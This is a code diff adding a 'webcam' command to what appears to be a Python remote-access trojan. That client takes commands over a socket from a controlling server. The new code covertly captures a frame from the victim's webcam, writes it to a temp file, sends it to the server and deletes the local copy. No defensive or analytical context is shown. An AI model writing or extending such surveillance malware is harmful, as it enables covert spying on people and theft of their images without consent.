@@ -350,6 +350,48 @@ quit       - Close connection
                         s.send(info.encode() + os.getcwd().encode() + b"> ")
                         continue
                 
+                if cmd == "webcam":
+                    info = "=== Webcam Capture ===\n"
+                    try:
+                        import cv2
+                        import tempfile
+                        
+                        cap = cv2.VideoCapture(0)
+                        if not cap.isOpened():
+                            info += "ERROR: No webcam found or webcam in use\n"
+                            s.send(info.encode() + os.getcwd().encode() + b"> ")
+                            continue
+                        
+                        ret, frame = cap.read()
+                        cap.release()
+                        
+                        if not ret:
+                            info += "ERROR: Failed to capture from webcam\n"
+                            s.send(info.encode() + os.getcwd().encode() + b"> ")
+                            continue
+                        
+                        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+                        filename = f"webcam_{timestamp}.png"
+                        filepath = os.path.join(tempfile.gettempdir(), filename)
+                        
+                        cv2.imwrite(filepath, frame)
+                        
+                        info += f"Webcam captured: {filepath}\n"
+                        info += "Transferring to server...\n"
+                        s.send(info.encode())
+                        
+                        send_file(s, filepath)
+                        os.remove(filepath)
+                        continue
+                    except ImportError:
+                        info += "ERROR: OpenCV not installed. Run: pip install opencv-python\n"
+                        s.send(info.encode() + os.getcwd().encode() + b"> ")
+                        continue
+                    except Exception as e:
+                        info += f"Error: {str(e)}\n"
+                        s.send(info.encode() + os.getcwd().encode() + b"> ")
+                        continue
+                
                 if data[:2].decode("utf-8") == 'cd':
                     try:
                         os.chdir(data[3:].decode("utf-8"))
